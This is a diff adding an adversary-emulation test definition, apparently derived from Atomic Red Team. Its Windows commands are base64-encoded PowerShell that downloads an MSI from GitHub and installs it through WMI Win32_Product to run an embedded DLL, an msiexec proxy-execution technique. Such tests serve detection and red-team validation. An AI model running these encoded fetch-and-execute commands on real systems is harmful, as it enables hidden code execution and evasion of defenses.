@@ -1,0 +1,18 @@
+- id: 11e75c4e-b2c3-5d6d-bda7-5df664305388
+  name: Soumaia ART Tests - WMI Win32_Product Class - Execute Local MSI file with an embedded DLL
+  description: Executes an MSI containing an embedded DLL using the WMI Win32_Product class
+  tactic: stealth
+  technique:
+    attack_id: T1218.007
+    name: 'Signed Binary Proxy Execution: Msiexec'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAyADEAOAAuADAAMAA3AF8ARABMAEwALgBtAHMAaQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMgAxADgALgAwADAANwBfAEQATABMAC4AbQBzAGkAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAyADEAOAAuADAAMAA3AC8AYgBpAG4ALwBUADEAMgAxADgALgAwADAANwBfAEQATABMAC4AbQBzAGkAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFQAMQAyADEAOAAuADAAMAA3AF8ARABMAEwALgBtAHMAaQAiAAoA
+          }
+          Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = '.\T1218.007_DLL.msi' }
+        payloads:
+        - T1218.007_DLL.msi
